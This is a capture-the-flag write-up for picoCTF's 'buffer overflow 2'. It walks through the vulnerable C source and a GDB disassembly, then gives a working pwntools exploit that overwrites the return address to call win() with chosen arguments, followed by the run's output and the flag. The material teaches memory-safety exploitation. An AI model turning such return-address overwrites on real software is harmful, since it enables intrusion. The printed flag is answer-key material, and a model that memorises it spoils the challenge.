# buffer overflow 2
## Description
Control the return address and arguments  
This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](vuln)?  
You can view source [here](vuln.c). And connect with it using `nc saturn.picoctf.net 61046`
## Hints
1. Try using GDB to print out the stack once you write to it.
## Solution
1. Connect to the server and check out what's running.
```console
% nc saturn.picoctf.net 61046
Please enter your string: 
hello, world
hello, world
```
2. Ok, seems to echo your input. What does the source code look like?
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
3. Classic buffer overflow setup. We want to overflow `buf` to set the return address to `win`, but we need to also put `arg1` and `arg2` on the stack. That means we need to store `win`'s address, a return address, `arg1`, and `arg2`, in order. Let's look in GDB for the addresses.
```assembly
% gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08049338 <+0>:	 endbr32 
   0x0804933c <+4>:	 push   ebp
   0x0804933d <+5>:	 mov    ebp,esp
   0x0804933f <+7>:	 push   ebx
   0x08049340 <+8>:	 sub    esp,0x74
   0x08049343 <+11>: call   0x80491d0 <__x86.get_pc_thunk.bx>
   0x08049348 <+16>: add    ebx,0x2cb8
   0x0804934e <+22>: sub    esp,0xc
   0x08049351 <+25>: lea    eax,[ebp-0x6c]
   0x08049354 <+28>: push   eax
   0x08049355 <+29>: call   0x80490f0 <gets@plt>
   0x0804935a <+34>: add    esp,0x10
   0x0804935d <+37>: sub    esp,0xc
   0x08049360 <+40>: lea    eax,[ebp-0x6c]
   0x08049363 <+43>: push   eax
   0x08049364 <+44>: call   0x8049120 <puts@plt>
   0x08049369 <+49>: add    esp,0x10
   0x0804936c <+52>: nop
   0x0804936d <+53>: mov    ebx,DWORD PTR [ebp-0x4]
   0x08049370 <+56>: leave  
   0x08049371 <+57>: ret    
End of assembler dump.
(gdb) p win
$1 = {<text variable, no debug info>} 0x8049296 <win>
(gdb) disas main
Dump of assembler code for function main:
   ...
   0x080493cf <+93>:	push   eax
   0x080493d0 <+94>:	call   0x8049120 <puts@plt>
   0x080493d5 <+99>:	add    esp,0x10
   0x080493d8 <+102>:	call   0x8049338 <vuln>
   0x080493dd <+107>:	mov    eax,0x0
   ...
```
4. Ok, we need `0x6c (108)` bytes of garbage, plus `4` more for EBP. We know `win` is at `0x8049296` and we should return where `vuln` would return, `0x080493dd`. From the source, `arg1` is `0xcafef00d` and `arg2` is `0xf00df00d`.
```python
from pwn import *

context.log_level = 'debug'

junk = b'a' * 108 + b'b' * 4        # overflow buf and EBP
win_addr = p32(0x08049296)          # address of win()
main_addr = p32(0x080493dd)         # return address in main()
arg1 = p32(0xcafef00d)
arg2 = p32(0xf00df00d)
payload = junk + win_addr + main_addr + arg1 + arg2

server = remote("saturn.picoctf.net", 61046)
server.recvline()                   # we know it sends a '\n' terminated prompt
server.sendline(payload)
server.recvline()                   # we don't care about the echoed payload
flag = server.recvrepeat().decode()
server.close()

print(flag)
```
```console
% python exploit.py
[+] Opening connection to saturn.picoctf.net on port 61046: Done
[DEBUG] Received 0x1b bytes:
    b'Please enter your string: \n'
[DEBUG] Sent 0x81 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000060  61 61 61 61  61 61 61 61  61 61 61 61  62 62 62 62  │aaaa│aaaa│aaaa│bbbb│
    00000070  96 92 04 08  dd 93 04 08  0d f0 fe ca  0d f0 0d f0  │····│····│····│····│
    00000080  0a                                                  │·│
    00000081
[DEBUG] Received 0xa3 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000060  61 61 61 61  61 61 61 61  61 61 61 61  62 62 62 62  │aaaa│aaaa│aaaa│bbbb│
    00000070  96 92 04 08  dd 93 04 08  0d f0 fe ca  0d f0 0d f0  │····│····│····│····│
    00000080  0a 70 69 63  6f 43 54 46  7b 61 72 67  75 6d 33 6e  │·pic│oCTF│{arg│um3n│
    00000090  74 35 5f 34  5f 64 34 79  5a 5f 33 31  34 33 32 64  │t5_4│_d4y│Z_31│432d│
    000000a0  65 62 7d                                            │eb}│
    000000a3
[*] Closed connection to saturn.picoctf.net port 61046
picoCTF{argum3nt5_4_d4yZ_31432deb}
```
